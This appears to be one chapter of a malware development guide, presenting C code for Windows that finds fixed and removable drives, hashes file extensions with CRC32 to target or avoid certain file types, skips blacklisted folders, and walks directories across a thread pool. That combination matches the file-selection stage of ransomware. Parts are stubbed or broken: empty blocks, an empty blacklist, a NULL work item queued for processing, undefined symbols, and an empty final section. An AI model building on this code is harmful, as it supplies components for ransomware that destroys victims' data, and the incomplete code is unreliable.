# 05 — File Enumeration

## Drive Discovery
```c
#define MAX_DRIVES 26

void EnumerateDrives(void) {
    DWORD dwMask = GetLogicalDrives();
    for (INT i = 0; i < MAX_DRIVES; i++) {
        if (!(dwMask & (1 << i))) continue;
        WCHAR szDrive[4]; wsprintfW(szDrive, L"%C:\\", L'A' + i);
        UINT uType = GetDriveTypeW(szDrive);
        if (uType == DRIVE_FIXED || uType == DRIVE_REMOVABLE) {
        }
    }
}
```

## CRC32B Hash Table (O(1) extension targeting)
```c
#define CRC_POLY        0xEDB88320
#define HASH_TABLE_SIZE 101
#define EMPTY_SLOT      0
#define HASH_W(s)       Crc32bW((LPWSTR)(s), FALSE)
#define HASH_LOWER_W(s) Crc32bW((LPWSTR)(s), TRUE)

ULONG g_HashTable[HASH_TABLE_SIZE] = { 0 };

UINT32 Crc32bW(WCHAR* sz, BOOL bLower) {
    UINT32 uHash = 0xFFFFEFFF;
    while (*sz) {
        WCHAR ch = bLower ? towlower(*sz) : *sz;
        uHash ^= (UINT32)ch;
        for (int j = 0; j < 8; j++) uHash = (uHash >> 1) ^ (CRC_POLY & (-(uHash & 1)));
        sz++;
    }
    return ~uHash;
}

ULONG HashFunc(ULONG u) { return u % HASH_TABLE_SIZE; }

BOOL InsertHash(ULONG u) {
    ULONG idx = HashFunc(u);
    while (g_HashTable[idx] != EMPTY_SLOT) {
        if (g_HashTable[idx] == u) return TRUE;
        idx = (idx + 1) % HASH_TABLE_SIZE;
    }
    g_HashTable[idx] = u;
    return TRUE;
}

BOOL IsHashInTable(ULONG u) {
    ULONG idx = HashFunc(u);
    while (g_HashTable[idx] != EMPTY_SLOT) {
        if (g_HashTable[idx] == u) return TRUE;
        idx = (idx + 1) % HASH_TABLE_SIZE;
    }
    return FALSE;
}

void InsertHashArray(ULONG arr[], DWORD dwCount) {
    for (DWORD i = 0; i < dwCount; i++) InsertHash(arr[i]);
}

void ClearHashTable(void) { memset(g_HashTable, 0, sizeof(g_HashTable)); }

ULONG GetFileExtHash(LPWSTR szPath) {
    LPWSTR szDot = wcsrchr(szPath, L'.');
    if (!szDot) return 0;
    return HASH_W(szDot + 1);
}
```

## Extension Targeting Modes
```c
typedef enum { FilesArePriority = 1, FilesAreTargeted, FilesAreAvoided } FILE_TARGET_MODE;
```

## Recursive Directory Walker (thread pool version)
```c
typedef struct _THREAD_PARMS {
    LPWSTR           szDirectory;
    FILE_TARGET_MODE Purpose;
    DWORD            dwAttributes;
    LARGE_INTEGER    FileSize;
} THREAD_PARMS, *PTHREAD_PARMS;

static BOOL IsBlacklistedDir(ULONG uHash) {
    static ULONG blacklist[] = {
    };
    for (DWORD i = 0; i < sizeof(blacklist)/sizeof(blacklist[0]); i++)
        if (uHash == blacklist[i]) return TRUE;
    return FALSE;
}

BOOL WINAPI FilesEnumForDrive(LPVOID lpParam) {
    PTHREAD_PARMS p = (PTHREAD_PARMS)lpParam;
    WIN32_FIND_DATAW fd = { 0 };
    WCHAR szSearch[MAX_PATH], szFull[MAX_PATH];

    InterlockedIncrement64(&g_ActiveTasks);
    StringCchPrintfW(szSearch, MAX_PATH, L"%s\\*.*", p->szDirectory);
    HANDLE hFind = FindFirstFileW(szSearch, &fd);
    if (hFind == INVALID_HANDLE_VALUE) goto _CLEANUP;

    do {
        if (!lstrcmpW(fd.cFileName, L".") || !lstrcmpW(fd.cFileName, L"..")) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

        StringCchPrintfW(szFull, MAX_PATH, L"%s\\%s", p->szDirectory, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (IsBlacklistedDir(HASH_LOWER_W(fd.cFileName))) continue;
            PTHREAD_PARMS pNew = NULL;
            EnqueueWork((LPTHREAD_START_ROUTINE)FilesEnumForDrive, pNew);
        } else {
            ULONG uHash = GetFileExtHash(szFull);
            BOOL bTarget = FALSE;
            switch (p->Purpose) {
                case FilesAreTargeted: bTarget = IsHashInTable(uHash); break;
                case FilesAreAvoided:  bTarget = !IsHashInTable(uHash); break;
                case FilesArePriority: bTarget = IsHashInTable(uHash); break;
            }
            if (bTarget) { }
        }
    } while (FindNextFileW(hFind, &fd));

_CLEANUP:
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    FreeMem(&p->szDirectory);
    FreeMem(&p);
    InterlockedDecrement64(&g_ActiveTasks);
    return TRUE;
}
```

## Two-Pass Priority Enumeration
```c
```
